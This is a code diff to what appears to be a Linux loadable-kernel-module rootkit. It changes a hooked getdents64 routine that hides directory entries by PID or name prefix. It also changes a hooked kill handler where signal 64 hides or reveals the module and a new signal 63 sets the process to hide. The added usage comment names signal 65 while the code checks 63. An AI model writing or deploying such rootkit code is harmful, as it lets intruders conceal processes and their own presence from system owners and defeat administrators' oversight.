@@ -91,8 +91,8 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 
 
     if ((memcmp(hide_proc, current_dir->d_name, strlen(hide_proc)) == 0
-				&& strncmp(hide_proc, "", NAME_MAX) != 0)
-				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0){
+				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0)
+			  && strncmp(hide_proc, "", NAME_MAX) != 0){
       printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
       if (current_dir == dirent_scratch){
         ret -= current_dir->d_reclen;
@@ -137,16 +137,17 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 		hide_me();
 		hidden = 1;
 		dir_hiding = 1;
-
-		printk(KERN_INFO "trying to hide %d\n", pid);
-		sprintf(hide_proc, "%d", pid); //usage: kill -64 [PID to hide]
-
 		return 0;
 	}
 	else if(sig == 64 && hidden){
 		show_me();
 		hidden = 0;
 		dir_hiding = 0;
+		return 0;
+	}
+	else if (sig == 63){
+		printk(KERN_INFO "Setting hidden pid to %i\n", pid);
+		sprintf(hide_proc, "%d", pid); //usage: kill -65 [PID to hide]
 		return 0;
 	}
 	return orig_kill(regs);
